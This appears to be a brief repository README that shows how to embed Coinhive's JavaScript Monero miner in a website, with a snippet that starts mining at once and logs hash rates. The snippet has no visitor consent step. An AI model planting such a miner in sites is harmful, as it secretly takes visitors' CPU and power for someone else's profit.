## Coinhive-miner.js 

Recently coinhive started a javascript based mining campaign. It mines monero/Bitmonero coin by using your websites user CPU.  It's a perfect way to serve an adfree website.

# POC
```javascript
    var miner = new CoinHive.User('4mtBNkLn1Cxz2uw9uMRPYFGXdcRUMngH', 'GitHubRepo');
	miner.start();
	// Listen on events
	miner.on('found', function() {console.log("-----FOUND-----");  });
	miner.on('accepted', function() {console.log("*****ACCEPT******");});
	
		setInterval(function() {
		var hashesPerSecond = miner.getHashesPerSecond();
		var totalHashes = miner.getTotalHashes();
		var acceptedHashes = miner.getAcceptedHashes();
console.log("PER-SECOND: " + hashesPerSecond + " TOTAL: " + totalHashes + " ACCEPTED: " +  acceptedHashes);
		// Output to HTML elements...
	}, 1000);
  ```
